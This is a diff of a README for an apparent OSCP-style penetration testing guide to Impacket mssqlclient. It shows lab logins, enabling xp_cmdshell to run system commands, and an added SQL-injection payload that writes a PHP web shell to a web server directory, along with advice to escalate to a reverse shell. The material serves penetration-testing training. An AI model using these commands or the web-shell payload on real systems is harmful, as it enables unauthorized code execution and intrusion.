@@ -1,4 +1,5 @@
-#  Penetration Testing with Impacket MSSQLClient "OSCP Guide"
+
+#  Penetration Testing with Impacket MSSQLClient "OSCP guide"
 
 This repository provides a comprehensive guide on how to perform advanced penetration testing using the Impacket `mssqlclient` tool. This guide covers the setup, configuration, and advanced usage scenarios for effective penetration testing.
 
@@ -10,10 +11,11 @@ This repository provides a comprehensive guide on how to perform advanced penetr
 4. [Enabling Advanced Options](#enabling-advanced-options)
 5. [Executing Commands](#executing-commands)
 6. [Advanced Usage](#advanced-usage)
-7. [Security Considerations](#security-considerations)
-8. [Resources](#resources)
-9. [Contributing](#contributing)
-10. [License](#license)
+7. [MySQL Database Penetration](#mysql-database-penetration)
+8. [Security Considerations](#security-considerations)
+9. [Resources](#resources)
+10. [Contributing](#contributing)
+11. [License](#license)
 
 ## Introduction
 
@@ -21,7 +23,7 @@ Impacket is a collection of Python classes for working with network protocols. `
 
 ## Installation
 
-To install Impacket, you need to have Python and pip installed. Follow these steps to install Impacket:
+To install Impacket, ensure Python and pip are installed, then follow these steps:
 
 ```bash
 git clone https://github.com/fortra/impacket.git
@@ -31,16 +33,10 @@ pip install .
 
 ## Connecting to a SQL Server
 
-Use `mssqlclient` to connect to a SQL Server instance:
+Use `mssqlclient` to connect to a SQL Server instance from your Kali VM:
 
 ```bash
-impacket-mssqlclient <username>:<password>@<hostname> -windows-auth
-```
-
-Example:
-
-```bash
-impacket-mssqlclient Malek:pass18113@192.168.212.182 -windows-auth
+impacket-mssqlclient Administrator:Lab123@192.168.212.18 -windows-auth
 ```
 
 ```plaintext
@@ -54,28 +50,19 @@ Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 [*] INFO(SQL01\SQLEXPRESS): Line 1: Changed language setting to us_english.
 [*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
 [!] Press help for extra shell commands
-SQL (SQLPLAYGROUND\Malek  dbo@master)> dir
-ERROR: Line 1: Could not find stored procedure 'dir'.
-SQL (SQLPLAYGROUND\Malek  dbo@master)> EXECUTE sp_configure 'show advanced options', 1;
-[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
-SQL (SQLPLAYGROUND\Malek  dbo@master)> RECONFIGURE;
-SQL (SQLPLAYGROUND\Malek  dbo@master)> EXECUTE sp_configure 'xp_cmdshell', 1;
-[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
-SQL (SQLPLAYGROUND\Malek  dbo@master)> RECONFIGURE;
-SQL (SQLPLAYGROUND\Malek  dbo@master)> EXECUTE xp_cmdshell 'whoami';
-output                        
----------------------------   
-nt service\mssql$sqlexpress   
+SQL (SQLPLAYGROUND\Administrator  dbo@master)> EXECUTE xp_cmdshell 'whoami';
+output
 
-NULL                          
-SQL (SQLPLAYGROUND\Malek  dbo@master)>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+nt service\mssql$sqlexpress
+
+NULL
 ```
 
 ## Enabling Advanced Options
 
-Before you can use certain advanced features like `xp_cmdshell`, you need to enable advanced options on the SQL Server.
-
-### Step-by-Step Guide
+To execute Windows shell commands via `xp_cmdshell`, follow these steps after connecting:
 
 1. **Enable advanced options**:
     ```sql
@@ -91,55 +78,37 @@ Before you can use certain advanced features like `xp_cmdshell`, you need to ena
 
 ## Executing Commands
 
-Once `xp_cmdshell` is enabled, you can execute system commands directly from the SQL Server.
-
-### Example Commands
+Once `xp_cmdshell` is enabled, execute system commands directly from the SQL Server:
 
 - **Check the current user**:
     ```sql
     EXEC xp_cmdshell 'whoami';
     ```
 
-- **List directory contents**:
-    ```sql
-    EXEC xp_cmdshell 'dir';
-    ```
-
-- **Create a new directory**:
-    ```sql
-    EXEC xp_cmdshell 'mkdir C:\path\to\new_directory';
-    ```
-
 ## Advanced Usage
 
-Here are some advanced scenarios and techniques for using `mssqlclient`:
+With full system control, escalate SQL shell to a reverse shell for expanded capabilities.
 
-- **Uploading and Executing Scripts**:
-    You can upload and execute scripts or binaries using `xp_cmdshell`.
+### MySQL Database Penetration
 
-- **Pivoting and Lateral Movement**:
-    Use `mssqlclient` in combination with other tools to pivot and move laterally within the network.
+While MySQL lacks a direct RCE function, leverage the `SELECT INTO OUTFILE` statement to write files on the web server.
 
-- **Extracting Data**:
-    Use SQL queries to extract sensitive data from the database.
+```sql
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
+```
 
 ## Security Considerations
 
-Using tools like `mssqlclient` comes with significant security risks. Here are some considerations:
+Exercise caution when using `mssqlclient` or similar tools:
 
-- Ensure you have proper authorization before performing penetration tests.
-- Be aware of the potential impact of your actions on the target systems.
-- Follow responsible disclosure practices if you discover vulnerabilities.
+- Obtain proper authorization for penetration testing.
+- Understand potential impact on systems.
+- Adhere to responsible disclosure practices for vulnerabilities.
 
 ## Resources
 
 - [Impacket GitHub Repository](https://github.com/fortra/impacket)
 - [SQL Server Documentation](https://docs.microsoft.com/en-us/sql/sql-server/)
-- [Tips](https://www.mssqltips.com/sqlservertip/1020/enabling-xpcmdshell-in-sql-server/)
 
-## Refrence 
 
-Offsec 
 ```
-
-You can copy and paste this markdown content directly into your `README.md` file on GitHub.
